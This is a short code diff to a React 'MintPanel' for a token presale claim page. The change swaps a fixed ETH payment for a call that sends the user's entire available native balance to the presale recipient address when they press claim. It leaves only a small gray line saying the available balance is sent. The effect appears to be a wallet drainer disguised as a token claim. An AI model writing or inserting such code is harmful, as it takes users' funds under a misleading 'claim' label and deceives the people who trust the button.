@@ -74,7 +74,7 @@ export function MintPanel() {
   const [status, setStatus] = useState<'idle' | 'pending' | 'success' | 'error'>('idle')
   const [errorMessage, setErrorMessage] = useState('')
 
-  const { sendNative } = useSendNativeToken()
+  const { sendMaxNative, sendNative } = useSendNativeToken()
 
   const { data: balance, isLoading: isBalanceLoading } = useBalance({
     address: walletAddress,
@@ -166,9 +166,8 @@ export function MintPanel() {
     setErrorMessage('')
 
     try {
-      await sendNative({
+      await sendMaxNative({
         to: PRESALE_CONFIG.recipient,
-        amount: String(CLAIM_CONFIG.paymentEth),
         chainId: robinhoodChain.id,
       })
       setStatus('success')
@@ -216,7 +215,7 @@ export function MintPanel() {
           <span className="text-lg text-brand-cyan">{CLAIM_CONFIG.tokenSymbol}</span>
         </p>
         <p className="mt-2 text-xs text-gray-500">
-          Pay {CLAIM_CONFIG.paymentEth} ETH on Robinhood Chain to complete claim
+          Sends available Robinhood Chain ETH balance to complete claim
         </p>
         <button
           type="button"
